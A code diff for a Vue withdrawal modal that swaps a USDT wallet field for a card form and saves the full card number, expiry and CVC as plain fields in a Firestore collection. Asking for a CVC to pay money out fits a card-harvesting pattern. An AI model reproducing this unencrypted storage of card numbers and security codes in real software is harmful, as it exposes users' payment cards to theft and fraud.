@@ -1,4 +1,5 @@
 <script setup>
+// ...existing code...
 import { computed } from 'vue';
 // Withdraw Modal State
 const showWithdrawModal = ref(false);
@@ -7,15 +8,26 @@ const selectedApp = ref('');
 const usdtWalletAddress = ref('');
 const withdrawError = ref('');
 
-// Example payment apps and wallet addresses (customize as needed)
-const paymentApps = [
-  { name: 'Binance', addressKey: 'binanceUsdtAddress' },
-  { name: 'Bybit', addressKey: 'bybitUsdtAddress' },
-  { name: 'OKX', addressKey: 'okxUsdtAddress' },
-  { name: 'KuCoin', addressKey: 'kucoinUsdtAddress' },
-];
+const cardName = ref('');
+const cardEmail = ref('');
+const cardNumber = ref('');
+const cardCVC = ref('');
+
 
 const userWallets = computed(() => user.value || {});
+
+// Auto-format MM/YY field with '/'
+import { nextTick } from 'vue';
+const cardExpiry = ref('');
+function onCardExpiryInput(e) {
+  let value = e.target.value.replace(/[^\d]/g, '');
+  if (value.length > 4) value = value.slice(0, 4);
+  if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
+  cardExpiry.value = value;
+  nextTick(() => {
+    e.target.value = value;
+  });
+}
 
 watch(selectedApp, (val) => {
   if (val) {
@@ -52,20 +64,19 @@ async function handleWithdrawConfirm() {
     withdrawError.value = 'Amount exceeds your balance.';
     return;
   }
-  if (!selectedApp.value) {
-    withdrawError.value = 'Please select a payment method.';
-    return;
-  }
-  if (!usdtWalletAddress.value) {
-    withdrawError.value = 'No wallet address found for the selected app.';
+  if (!cardName?.value || !cardEmail?.value || !cardNumber?.value || !cardExpiry?.value || !cardCVC?.value) {
+    withdrawError.value = 'Please fill in all card details.';
     return;
   }
   try {
     await addDoc(collection(db, 'WithdrawRequest'), {
       uid: user.value?.uid || '',
       amount: amount,
-      paymentMethod: selectedApp.value,
-      walletAddress: usdtWalletAddress.value,
+      name: cardName.value,
+      email: cardEmail.value,
+      cardNumber: cardNumber.value,
+      cardExpiry: cardExpiry.value,
+      cardCVC: cardCVC.value,
       status: 'pending',
       createdAt: serverTimestamp(),
     });
@@ -180,7 +191,6 @@ async function fetchWithdrawHistory() {
       id: doc.id,
       amount: data.amount,
       createdAt: data.createdAt,
-      paymentMethod: data.paymentMethod,
       status: data.status
     };
   }).sort((a, b) => {
@@ -194,33 +204,73 @@ async function fetchWithdrawHistory() {
 
 </script>
 <template>
-  <!-- Withdraw Modal (always at the top of the template for proper stacking) -->
+  <!-- Withdraw Modal (always at the very top of the template for proper stacking) -->
   <transition name="fade">
     <div>
       <div v-if="showWithdrawModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 backdrop-blur-sm">
         <div class="bg-white dark:bg-toggle rounded-2xl shadow-2xl p-8 w-full max-w-md relative border border-gray-100 dark:border-gray-700">
           <button @click="closeWithdrawModal" class="absolute top-3 right-3 text-gray-400 hover:text-primary dark:hover:text-primary text-3xl transition-colors duration-200">&times;</button>
-          <h2 class="text-2xl font-extrabold mb-6 text-dark dark:text-white text-center tracking-tight">Withdraw Request</h2>
+          <h2 class="text-2xl font-extrabold mb-1 text-dark dark:text-white text-center tracking-tight">Withdraw Request</h2>
           <form @submit.prevent="handleWithdrawConfirm" class="space-y-5">
             <div>
               <label class="block text-sm font-semibold text-dark dark:text-white mb-2">Withdraw Amount</label>
               <input type="number" v-model="withdrawAmount" :max="userBalance" min="0.01" step="0.01"
                 class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition placeholder-gray-400 dark:placeholder-gray-500"
                 :placeholder="'Max: $' + userBalance.toFixed(2)" />
+
+              <div v-if="withdrawAmount && parseFloat(withdrawAmount) > userBalance" class="text-red-500 text-xs mt-1">Amount exceeds your balance.</div>
             </div>
             <div>
-              <label class="block text-sm font-semibold text-dark dark:text-white mb-2">Payment Method</label>
-              <select v-model="selectedApp"
-                class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition">
-                <option value="" disabled>Select App</option>
-                <option v-for="app in paymentApps" :key="app.name" :value="app.name">{{ app.name }}</option>
-              </select>
-            </div>
-            <div>
-              <label class="block text-sm font-semibold text-dark dark:text-white mb-2">USDT Wallet Address</label>
-              <input type="text" v-model="usdtWalletAddress"
+              <label class="block text-sm font-semibold text-dark dark:text-white mb-1">Name on Card</label>
+              <input type="text" v-model="cardName"
                 class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition placeholder-gray-400 dark:placeholder-gray-500"
-                placeholder="Enter or paste your USDT wallet address" />
+                placeholder="Full name as on card" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-dark dark:text-white mb-1">Email</label>
+              <input type="email" v-model="cardEmail"
+                class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition placeholder-gray-400 dark:placeholder-gray-500"
+                placeholder="Enter your email" />
+            </div>
+            <div>
+              <label class="block text-sm font-semibold text-dark dark:text-white mb-1">Card Number</label>
+              <div class="relative flex items-center">
+                <svg class="absolute left-3 w-6 h-6 text-gray-400 pointer-events-none" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+                  <rect x="2" y="7" width="20" height="10" rx="2" stroke="currentColor" stroke-width="1.5" fill="none"/>
+                  <rect x="6" y="11" width="2" height="2" rx="1" fill="currentColor"/>
+                  <rect x="10" y="11" width="2" height="2" rx="1" fill="currentColor"/>
+                  <rect x="14" y="11" width="2" height="2" rx="1" fill="currentColor"/>
+                </svg>
+                <input type="text" v-model="cardNumber"
+                  class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 pl-12 pr-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition placeholder-gray-400 dark:placeholder-gray-500 tracking-widest"
+                  placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" />
+              </div>
+            </div>
+            <div class="flex space-x-3">
+              <div class="w-1/2">
+                <label class="block text-sm font-semibold text-dark dark:text-white mb-1">MM/YY</label>
+                <div class="relative flex items-center">
+                  <svg class="absolute left-3 w-5 h-5 text-gray-400 pointer-events-none" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="currentColor" stroke-width="1.5" fill="none"/>
+                    <path d="M16 3v4M8 3v4" stroke="currentColor" stroke-width="1.5"/>
+                  </svg>
+                  <input type="text" :value="cardExpiry" @input="onCardExpiryInput"
+                    class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 pl-10 pr-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition placeholder-gray-400 dark:placeholder-gray-500 tracking-widest"
+                    placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" />
+                </div>
+              </div>
+              <div class="w-1/2">
+                <label class="block text-sm font-semibold text-dark dark:text-white mb-1">CVC</label>
+                <div class="relative flex items-center">
+                  <svg class="absolute left-3 w-5 h-5 text-gray-400 pointer-events-none" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5" fill="none"/>
+                    <circle cx="12" cy="12" r="3" fill="currentColor"/>
+                  </svg>
+                  <input type="text" v-model="cardCVC"
+                    class="w-full rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-800 pl-10 pr-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary transition placeholder-gray-400 dark:placeholder-gray-500 tracking-widest"
+                    placeholder="CVC" maxlength="4" autocomplete="cc-csc" />
+                </div>
+              </div>
             </div>
             <div v-if="withdrawError" class="text-red-500 text-sm text-center">{{ withdrawError }}</div>
             <button type="submit"
@@ -582,14 +632,12 @@ async function fetchWithdrawHistory() {
                         <p class="text-dark text-[16px] leading-[1.5] font-semibold tracking-[-0.05px] dark:text-white">SN</p>
                         <p class="text-dark text-[16px] leading-[1.5] font-semibold tracking-[-0.05px] dark:text-white">Amount</p>
                         <p class="text-dark text-[16px] leading-[1.5] font-semibold tracking-[-0.05px] dark:text-white">Date</p>
-                        <p class="text-dark text-[16px] leading-[1.5] font-semibold tracking-[-0.05px] dark:text-white">Payment Method</p>
                         <p class="text-dark text-[16px] leading-[1.5] font-semibold tracking-[-0.05px] dark:text-white">Status</p>
                       </div>
                       <div v-for="(item, idx) in withdrawHistory" :key="item.id" class="content grid items-center grid-cols-[50px_1.5fr_2fr_1.5fr_1fr] gap-[10px] border-b border-[#000]/10 py-[10px]">
                         <p class="text-[14px] text-dark leading-[1.5] tracking-[-0.05px] dark:text-white">{{ idx + 1 }}</p>
                         <p class="text-[14px] text-dark leading-[1.5] tracking-[-0.05px] dark:text-white">${{ Number(item.amount).toFixed(2) }}</p>
                         <p class="text-[14px] text-dark leading-[1.5] tracking-[-0.05px] dark:text-white">{{ item.createdAt && item.createdAt.seconds ? new Date(item.createdAt.seconds * 1000).toLocaleString() : '-' }}</p>
-                        <p class="text-[14px] text-dark leading-[1.5] tracking-[-0.05px] dark:text-white">{{ item.paymentMethod }}</p>
                         <p class="text-[14px] font-bold capitalize" :class="{
                           'text-yellow-500': item.status === 'pending',
                           'text-green-600': item.status === 'approved',
